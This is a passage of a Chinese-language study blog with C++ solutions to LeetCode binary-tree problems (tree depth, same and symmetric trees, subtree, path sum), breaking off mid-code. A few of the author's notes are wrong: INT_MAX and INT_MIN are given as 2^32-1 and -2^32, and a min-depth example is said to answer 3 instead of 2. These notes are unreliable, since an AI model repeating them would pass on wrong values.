<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//递归</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">Depth</span><span class="params">(Node *root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> depth = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;root-&gt;children.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(root-&gt;children[i])</span><br><span class="line">                depth = <span class="built_in">max</span>(<span class="built_in">Depth</span>(root-&gt;children[i]),depth);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> depth+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Depth</span>(root);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    迭代-队列</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;Node*&gt; que;</span><br><span class="line">        <span class="keyword">if</span>(root)</span><br><span class="line">            que.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">int</span> depth = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(!que.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="keyword">int</span> size = que.<span class="built_in">size</span>();<span class="comment">//本层结点个数</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line">                Node *node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;node-&gt;children.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(node-&gt;children[i])</span><br><span class="line">                        que.<span class="built_in">push</span>(node-&gt;children[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            depth++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> depth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="111-二叉树的最小深度"><a href="#111-二叉树的最小深度" class="headerlink" title="111 二叉树的最小深度"></a>111 二叉树的最小深度</h3><p>给定一个二叉树，找出其<strong>最小深度</strong>。<br>最小深度是从根节点到<strong>最近</strong>叶子节点的最短路径上的节点数量。<br>说明：叶子节点是指没有子节点的节点。<br>INT_MAX=2^32-1=2147483647<br>INT_MIN=-2^32=-2147483648</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minDepth</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left==<span class="literal">nullptr</span> || root-&gt;right==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">minDepth</span>(root-&gt;left)+<span class="built_in">minDepth</span>(root-&gt;right)+<span class="number">1</span>;<span class="comment">//必须进行该if判断</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">min</span>(<span class="built_in">minDepth</span>(root-&gt;left),<span class="built_in">minDepth</span>(root-&gt;right))+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    注意【求最小深度】不能像求最大深度那杨，直接</span></span><br><span class="line"><span class="comment">    return min(minDepth(root-&gt;left),minDepth(root-&gt;right))+1;即可</span></span><br><span class="line"><span class="comment">    因为最小深度，在某结点左子树是空，右子树不为空时，若直接按照return求，结果是1；起始应该是3.如下例子。</span></span><br><span class="line"><span class="comment">    1 null 2 null null null</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//广度：层序遍历-队列</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minDepth</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) </span><br><span class="line">            que.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">int</span> minDepth = INT_MAX;</span><br><span class="line">        <span class="keyword">int</span> depth = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">int</span> size = que.<span class="built_in">size</span>();<span class="comment">//该层个数</span></span><br><span class="line">            depth++;<span class="comment">//最小深度 重点！！！！</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                TreeNode *node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) </span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) </span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">                <span class="keyword">if</span>(node-&gt;left==<span class="literal">nullptr</span> &amp;&amp; node-&gt;right==<span class="literal">nullptr</span>)</span><br><span class="line">                    <span class="keyword">return</span> depth;<span class="comment">//第一次遇到某节点的 左右孩子都是nullptr时，其就是最小深度</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//队列是空，证明没有根节点，即是 空树，返回 0</span></span><br><span class="line">        <span class="keyword">return</span> depth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>见下图：<br><img src="https://img-blog.csdnimg.cn/6afc1707bd1440f398b27cee7828cc7e.png"></p>
<h3 id="100-相同的树"><a href="#100-相同的树" class="headerlink" title="100 相同的树"></a>100 相同的树</h3><p><strong>对称二叉树</strong><br>给你两棵二叉树的根节点 p 和 q ，编写一个函数来检验这两棵树是否相同。<br>如果两个树在结构上相同，并且节点具有相同的值，则认为它们是相同的。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//递归</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(TreeNode *u, TreeNode *v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!u &amp;&amp; !v)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(!u || !v)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> u-&gt;val==v-&gt;val &amp;&amp; <span class="built_in">check</span>(u-&gt;left,v-&gt;left) &amp;&amp; <span class="built_in">check</span>(u-&gt;right,v-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isSameTree</span><span class="params">(TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">check</span>(p,q);   </span><br><span class="line">    &#125; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    深度优先搜索</span></span><br><span class="line"><span class="comment">    O(min(m,n))</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isSameTree</span><span class="params">(TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(p==<span class="literal">NULL</span> &amp;&amp; q==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(p==<span class="literal">NULL</span> || q==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(p-&gt;val != q-&gt;val)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">isSameTree</span>(p-&gt;left,q-&gt;left) &amp;&amp; <span class="built_in">isSameTree</span>(p-&gt;right,q-&gt;right);</span><br><span class="line">        &#125; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  同 对称二叉树-</span></span><br><span class="line"><span class="comment">    广度：队列</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(TreeNode *u, TreeNode *v)</span></span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; q;</span><br><span class="line">        q.<span class="built_in">push</span>(u);</span><br><span class="line">        q.<span class="built_in">push</span>(v);</span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            u = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            v = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span>(!u &amp;&amp; !v)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span>((!v || !u) || (u-&gt;val != v-&gt;val))<span class="comment">//注意 条件:两个、顺序不能改动</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            q.<span class="built_in">push</span>(u-&gt;left);</span><br><span class="line">            q.<span class="built_in">push</span>(v-&gt;left);</span><br><span class="line">            q.<span class="built_in">push</span>(u-&gt;right);</span><br><span class="line">            q.<span class="built_in">push</span>(v-&gt;right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isSameTree</span><span class="params">(TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">check</span>(p,q);   </span><br><span class="line">    &#125; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="101-对称二叉树"><a href="#101-对称二叉树" class="headerlink" title="101 对称二叉树"></a>101 对称二叉树</h3><p>给你一个二叉树的根节点 root ， 检查它是否轴对称。<br><strong>左右子树是否相等</strong>：相等了也不一定是 对称的！！！<br>【下面示例】：左右子树相等，但不是对称的！<br><img src="https://img-blog.csdnimg.cn/5e1999bf9d5643ad959e55005180f757.png"><br>如果一个树的左子树与右子树镜像对称，那么这个树是对称的。</p>
<p>两个树互为镜像：</p>
<ul>
<li>它们的两个根结点具有相同的值</li>
<li>每个树的右子树都与另一个树的左子树镜像对称</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归 O(n)</span></span><br><span class="line"><span class="comment">    「同步移动」两个指针的方法来遍历这棵树，p 指针和</span></span><br><span class="line"><span class="comment">     q 指针一开始都指向这棵树的根，随后 p 右移时，</span></span><br><span class="line"><span class="comment">     q 左移，p 左移时，q 右移。每次检查当前 p 和 q</span></span><br><span class="line"><span class="comment">      节点的值是否相等，如果相等再判断左右子树是否对</span></span><br><span class="line"><span class="comment">      称。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(TreeNode *p,TreeNode *q)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!p &amp;&amp; !q)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(!p || !q)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> p-&gt;val==q-&gt;val &amp;&amp; <span class="built_in">check</span>(p-&gt;left,q-&gt;right) &amp;&amp; <span class="built_in">check</span>(p-&gt;right,q-&gt;left);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isSymmetric</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">check</span>(root,root);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>引入一个队列，这是把递归程序改写成迭代程序的常用方法</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    迭代 O(n)</span></span><br><span class="line"><span class="comment">    首先引入一个队列。</span></span><br><span class="line"><span class="comment">    初始化时我们把根节点入队两次。每次提取两个结点并比</span></span><br><span class="line"><span class="comment">    较它们的值（【队列中每两个连续的结点应该是相等的】，</span></span><br><span class="line"><span class="comment">    【而且它们的子树互为镜像】），然后将两个结点的左右子结点</span></span><br><span class="line"><span class="comment">    按相反的顺序插入队列中。当队列为空时，或者我们检测</span></span><br><span class="line"><span class="comment">    到树不对称（即从队列中取出两个不相等的连续结点）</span></span><br><span class="line"><span class="comment">    时，该算法结束。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(TreeNode *u,TreeNode *v)</span></span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; q;</span><br><span class="line">        q.<span class="built_in">push</span>(u);</span><br><span class="line">        q.<span class="built_in">push</span>(v);</span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            u = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            v = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span>(!u &amp;&amp; !v)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span>((!u || !v) || (u-&gt;val!=v-&gt;val))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            q.<span class="built_in">push</span>(u-&gt;left);</span><br><span class="line">            q.<span class="built_in">push</span>(v-&gt;right);</span><br><span class="line"></span><br><span class="line">            q.<span class="built_in">push</span>(u-&gt;right);</span><br><span class="line">            q.<span class="built_in">push</span>(v-&gt;left);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isSymmetric</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">check</span>(root,root);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="572-另一棵树的子树"><a href="#572-另一棵树的子树" class="headerlink" title="572 另一棵树的子树"></a>572 另一棵树的子树</h3><p>给你两棵二叉树 root 和 subRoot 。检验 root 中是否包含和 subRoot 具有相同结构和节点值的子树。如果存在，返回 true ；否则，返回 false 。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    改：写两个函数，分开</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//两个树 是否相同</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(TreeNode *root, TreeNode *subRoot)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!root &amp;&amp; !subRoot)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(!root || !subRoot)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;val != subRoot-&gt;val)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">check</span>(root-&gt;left,subRoot-&gt;left)&amp;&amp;<span class="built_in">check</span>(root-&gt;right,subRoot-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//寻找</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">find</span><span class="params">(TreeNode *root, TreeNode *subRoot)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!root)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//遍历到最后都没找到 和 subRoot-&gt;val相同的root-&gt;val</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">check</span>(root,subRoot))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">find</span>(root-&gt;left,subRoot)||<span class="built_in">find</span>(root-&gt;right,subRoot);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isSubtree</span><span class="params">(TreeNode* root, TreeNode* subRoot)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">find</span>(root,subRoot);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="112-路径总和——【判断】是否存在-满足条件的路径"><a href="#112-路径总和——【判断】是否存在-满足条件的路径" class="headerlink" title="112 路径总和——【判断】是否存在 满足条件的路径"></a>112 路径总和——【判断】是否存在 满足条件的路径</h2><p>给你二叉树的根节点 root 和一个表示目标和的整数 targetSum 。判断该树中是否存在【根节点到叶子节点】的路径，这条路径上所有节点值相加等于目标和 targetSum 。如果存在，返回 true ；否则，返回 false 。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归</span></span><br><span class="line"><span class="comment">    时间：O(N) 遍历一次</span></span><br><span class="line"><span class="comment">    空间：O(H)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">hasPathSum</span><span class="params">(TreeNode* root, <span class="keyword">int</span> sum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">//从根节点到当前节点的值之和为 val</span></span><br><span class="line">        <span class="comment">//将这个大问题转化为一个小问题：是否存在从当前节点的子节点到叶子的路径，满足其路径和为 sum-val</span></span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left==<span class="literal">nullptr</span> &amp;&amp; root-&gt;right==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> sum==root-&gt;val;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hasPathSum</span>(root-&gt;left,sum-root-&gt;val) || <span class="built_in">hasPathSum</span>(root-&gt;right,sum-root-&gt;val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    广度优先遍历</span></span><br><span class="line"><span class="comment">    时间：O(N) 遍历一次</span></span><br><span class="line"><span class="comment">    空间：O(N) 队列开销</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">hasPathSum</span><span class="params">(TreeNode* root, <span class="keyword">int</span> sum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        queue&lt;TreeNode*&gt; que_node;</span><br><span class="line">        queue&lt;<span class="keyword">int</span>&gt; que_val;</span><br><span class="line">        que_node.<span class="built_in">push</span>(root);</span><br><span class="line">        que_val.<span class="built_in">push</span>(root-&gt;val);</span><br><span class="line">        <span class="keyword">while</span>(!que_node.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            TreeNode *now = que_node.<span class="built_in">front</span>();</span><br><span class="line">            <span class="keyword">int</span> tmp = que_val.<span class="built_in">front</span>();<span class="comment">//当前结点 值</span></span><br><span class="line">            que_node.<span class="built_in">pop</span>();</span><br><span class="line">            que_val.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span>(now-&gt;left==<span class="literal">nullptr</span> &amp;&amp; now-&gt;right==<span class="literal">nullptr</span>)&#123;<span class="comment">//到叶结点时 进行判断</span></span><br><span class="line">                <span class="keyword">if</span>(tmp==sum)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(now-&gt;left != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">                que_node.<span class="built_in">push</span>(now-&gt;left);</span><br><span class="line">                que_val.<span class="built_in">push</span>(now-&gt;left-&gt;val+tmp);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(now-&gt;right != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">                que_node.<span class="built_in">push</span>(now-&gt;right);</span><br><span class="line">                que_val.<span class="built_in">push</span>(now-&gt;right-&gt;val+tmp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="113-路径总和-II——【返回】-满足条件的路径"><a href="#113-路径总和-II——【返回】-满足条件的路径" class="headerlink" title="113 路径总和 II——【返回】 满足条件的路径"></a>113 路径总和 II——【返回】 满足条件的路径</h2><p>给你二叉树的根节点 root 和一个整数目标和 targetSum ，找出 <strong>所有</strong> 从根节点到叶子节点 路径总和等于给定目标和的路径。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    注意回溯！！</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; path;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(TreeNode *root, <span class="keyword">int</span> targetSum)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        path.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">        targetSum -= root-&gt;val;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left==<span class="literal">nullptr</span> &amp;&amp; root-&gt;right==<span class="literal">nullptr</span> &amp;&amp; targetSum==<span class="number">0</span>)</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line">        <span class="comment">//注意！！！！！！！正确</span></span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left)&#123;</span><br><span class="line">            <span class="built_in">dfs</span>(root-&gt;left,targetSum);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();<span class="comment">//回溯</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;right)&#123;</span><br><span class="line">            <span class="built_in">dfs</span>(root-&gt;right,targetSum);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();<span class="comment">//回溯</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">pathSum</span>(TreeNode* root, <span class="keyword">int</span> targetSum) &#123;</span><br><span class="line">        <span class="built_in">dfs</span>(root,targetSum);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//看看！！！！！！！！！！</span></span><br><span class="line"><span class="comment">//正确</span></span><br><span class="line"><span class="keyword">if</span>(root-&gt;left==<span class="literal">nullptr</span> &amp;&amp; root-&gt;right==<span class="literal">nullptr</span> &amp;&amp; targetSum==<span class="number">0</span>)</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line"><span class="comment">//else&#123;</span></span><br><span class="line"><span class="built_in">dfs</span>(root-&gt;left,targetSum);</span><br><span class="line"><span class="built_in">dfs</span>(root-&gt;right,targetSum);</span><br><span class="line">path.<span class="built_in">pop_back</span>();<span class="comment">//回溯</span></span><br><span class="line"><span class="comment">//&#125; </span></span><br><span class="line"><span class="comment">//错误</span></span><br><span class="line"><span class="keyword">if</span>(root-&gt;left==<span class="literal">nullptr</span> &amp;&amp; root-&gt;right==<span class="literal">nullptr</span> &amp;&amp; targetSum==<span class="number">0</span>)</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">dfs</span>(root-&gt;left,targetSum);</span><br><span class="line">    <span class="built_in">dfs</span>(root-&gt;right,targetSum);</span><br><span class="line">    path.<span class="built_in">pop_back</span>();<span class="comment">//回溯</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    上道题已经可以获取到 满足条件的叶节点，本题重点是获取 该叶节点的完整路径</span></span><br><span class="line"><span class="comment">    可以写一个函数获取getPath()</span></span><br><span class="line"><span class="comment">    vector&lt;vector&lt;int&gt;&gt; res;</span></span><br><span class="line"><span class="comment">    unordered_map&lt;TreeNode*, TreeNode*&gt; parent;//记录每个结点的父节点</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">    unordered_map&lt;TreeNode*, TreeNode*&gt; parent;<span class="comment">//记录每个结点的父节点</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getPath</span><span class="params">(TreeNode *node)</span></span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; tmp;</span><br><span class="line">        <span class="keyword">while</span>(node)&#123;</span><br><span class="line">            tmp.<span class="built_in">push_back</span>(node-&gt;val);</span><br><span class="line">            node = parent[node];<span class="comment">//从叶节点向上遍历，一直到根节点，得到完整的路径</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">reverse</span>(tmp.<span class="built_in">begin</span>(),tmp.<span class="built_in">end</span>());<span class="comment">//逆序</span></span><br><span class="line">        res.<span class="built_in">push_back</span>(tmp);<span class="comment">//添加到结果集中</span></span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">pathSum</span>(TreeNode* root, <span class="keyword">int</span> targetSum) &#123;</span><br><span class="line">        <span 